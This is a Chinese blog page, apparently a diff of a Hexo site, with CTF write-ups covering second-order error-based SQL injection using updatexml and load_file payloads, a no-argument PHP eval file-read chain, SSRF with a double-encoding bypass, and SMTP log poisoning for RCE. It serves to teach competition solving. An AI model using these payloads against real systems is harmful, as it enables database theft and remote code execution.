+                    &lt;h3&gt;电话:&lt;/h3&gt;
+                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;
+                    &lt;/p&gt;
+                    &lt;p&gt;
+                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;删除订单&lt;/button&gt;
+                    &lt;/p&gt;
+                &lt;/form&gt;
+                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;f&quot;&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row&quot;&gt;
+            &lt;h2 class=&quot;mb&quot;&gt;订单管理&lt;/h2&gt;
+            &lt;a href=&quot;./index.php&quot;&gt;
+                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;返回&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./search.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;/button&gt;
+            &lt;/a&gt;
+            &lt;a href=&quot;./change.php&quot;&gt;
+                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;/button&gt;
+            &lt;/a&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>config.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+
+ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);
+
+$DATABASE = array(
+
+    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,
+    &quot;username&quot; =&gt; &quot;root&quot;,
+    &quot;password&quot; =&gt; &quot;root&quot;,
+    &quot;dbname&quot; =&gt;&quot;ctfusers&quot;
+);
+
+$db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABASE[&#39;password&#39;],$DATABASE[&#39;dbname&#39;]);
+</code></pre>
+</li>
+<li><p>分析：</p>
+<ul>
+<li>我们从代码中可以看到在查询的时候使用了正则去过滤，在写入时候使用了预处理所以无法进行注入。但是可以注意到使用正则过滤的时候并没有对地址过滤，我们跟进可以发现在<code>change.php</code>里地址是拼接进sql语句了，但是使用了<code>addslashes()</code>对单引号进行了转义，导致无法逃逸，但是这里可以导致在修改地址时候会将地址查询出来再拼接到更新语句，那么这里就算我们逃逸不了但是可以将后面的单引号给注释掉导致报错，同时这里将sql错误内容给打印出来了，可以使用报错注入。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732167224952.png" alt="img"></p>
+</li>
+<li><p>构造payload</p>
+<pre><code class="php">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</code></pre>
+<ul>
+<li>在写入时候将上面payload写入地址，而后修改该订单的地址就会显示报错。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732178817223.png" alt="img"></p>
+<ul>
+<li>爆表名</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema=&#39;ctfusers&#39;),0x7e),1)#</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191108/15732192818932.png" alt="img"></p>
+<ul>
+<li>爆表段</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name=&#39;user&#39;),0x7e),1)#</code></pre>
+<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108213119371.png" alt="image-20191108213119371"></p>
+<ul>
+<li>在表中并未查找出来flag，最后读文件读出来了</li>
+</ul>
+<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#
+
+1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),20,50)),0x7e),1)#</code></pre>
+<ul>
+<li>flag</li>
+</ul>
+<pre><code class="mysq">flag{71ee17ac-d06a-4  4aca-91c3-ae8671029100} </code></pre>
+</li>
+<li><p>延伸</p>
+<ul>
+<li><p>UPDATEXML </p>
+<ul>
+<li><pre><code class="mysql">UPDATEXML (XML_document, XPath_string, new_value); </code></pre>
+<ul>
+<li>参数1：XML_document是String格式，为XML文档对象的名称，文中为Doc  </li>
+<li>参数2：XPath_string (Xpath格式的字符串)  </li>
+<li>参数3:    new_value，String格式，替换查找到的符合条件的数据  </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d51d5193e2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/d51d5193e2.html" class="post-title-link" itemprop="url">上海大学生联赛部分write up</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-02 22:28:47" itemprop="dateCreated datePublished" datetime="2019-11-02T22:28:47+08:00">2019-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-14 17:17:18" itemprop="dateModified" datetime="2020-10-14T17:17:18+08:00">2020-10-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
+<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
+<li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
+</li>
+<li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
+<pre><code class="php"> &lt;?php
+highlight_file(__FILE__);
+$code = $_GET[&#39;code&#39;];
+if (!empty($code)) {
+        if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;, NULL, $code)) {
+            if (preg_match(&#39;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) {
+                    echo &#39;bye~&#39;;
+                } else {
+                    eval($code);
+                }
+            }
+        else {
+            echo &quot;No way!!!&quot;;
+        }
+}else {
+        echo &quot;No way!!!&quot;;
+    }
+No way!!!</code></pre>
+</li>
+<li><p>在一轮FUZZ之后我们可以得知有下面函数可用。(翻了好久，总共能过这个正则的有300多个函数吧)</p>
+<pre><code class="php">echo、implode、scandir、chr、strrev、uniqid、file、chdir、next、pos、end</code></pre>
+</li>
+<li><p>我们用字节跳动的无参数RCE知道，要读取目录那么就必须构造出<code>scandir(&#39;.&#39;)</code>,一轮无脑翻阅手册后可以知道uniqid()会生成一个唯一的临牌，但是呢，他后半部分是会变化的，那么我们将其翻转过来就能动态构造任意字符如：</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+for($i=0;$i&lt;1000;$i++)
+echo(chr(strrev(uniqid())));
+?&gt;</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
+</li>
+<li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
+<pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
+</li>
+<li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
+<pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
+</li>
+<li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
+<pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
+</li>
+<li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
+<pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
+</li>
+<li><p>读取文件呢，我们可以使用第一个payload读取到文件目录，然后使用end()函数去读取最后一个元素，进而读取文件。</p>
+<pre><code class="php">file(end(scandir(chr(strrev(uniqid()))))</code></pre>
+</li>
+<li><p>那么综合起来payload如下：</p>
+<pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
+</li>
+<li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
+</li>
+</ul>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
+<li><p>开头非常简单的ssrf，直接使用file:///协议即可读到内容</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$x = $_GET[&#39;x&#39;];
+$pos = strpos($x,&quot;php&quot;);
+if($pos){
+        exit(&quot;denied&quot;);
+}
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+$result = curl_exec($ch);
+echo $result; </code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
+</li>
+<li><p>这里直接读flag.php,直接使用双url编码绕过</p>
+<pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
+</li>
+</ul>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
+<ul>
+<li><p>提示/etc/hosts</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
+</li>
+<li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
+</li>
+<li><p>扫描这个主机开放的端口</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
+</li>
+<li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
+<pre><code class="php">/var/log/maillog
+/var/log/mail.log
+/var/adm/maillog
+/var/adm/syslog/mail.log</code></pre>
+</li>
+</ul>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
+      src="/header.jpg">
+  <p class="site-author-name" itemprop="name">XiaoLeung</p>
+  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
 </div>
 
 
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
 
 
+      </div>
+    </main>
 
-<div class="fat-footer">
-	<div class="wrapper">
-		<div class="layout layout--center">
-			<div class="layout__item palm-mb">
-				<div class="media">
-					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
-					<div class="media__body">
-						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
-						<p class='site-description'>Don&#39;t forget why we started</p>
-					</div>
-				</div>
-				<div class="author-contact">
-					<ul>
-						
-							
-							<li>
-				        		<a href="https://github.com/sharpleung" target="_blank">
-				        			
-				        				<i class="iconfont icon-github"></i>
-				        			
-				        		</a>
-				        	</li>
-						
-							
-							<li>
-				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
-				        			
-				        				<i class="iconfont icon-weixin"></i>
-				        			
-				        		</a>
-				        	</li>
-						
-					</ul>
-				</div>
-			</div>
-		</div>
-	</div>
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
+      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">225k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:25</span>
 </div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
 
 
-<footer class="footer" role="contentinfo">
 
-	<div class="wrapper wrapper--wide split split--responsive">
-<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
-<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
 
-		
-			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
-		
-		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
-	</div>
-</footer>
 
-	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
-	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
-	<script src="/js/lib.js"></script>
-	<script src="/js/google-code-prettify/prettify.js"></script>
-	<script src="/js/module.js"></script>
-	<script src="/js/script.js"></script>
-	
-		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-	<script type='text/javascript'>
-		//代码高亮
-		$(document).ready(function(){
-	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
-   			prettyPrint();
-		});
-	</script>
-	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
- <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
-
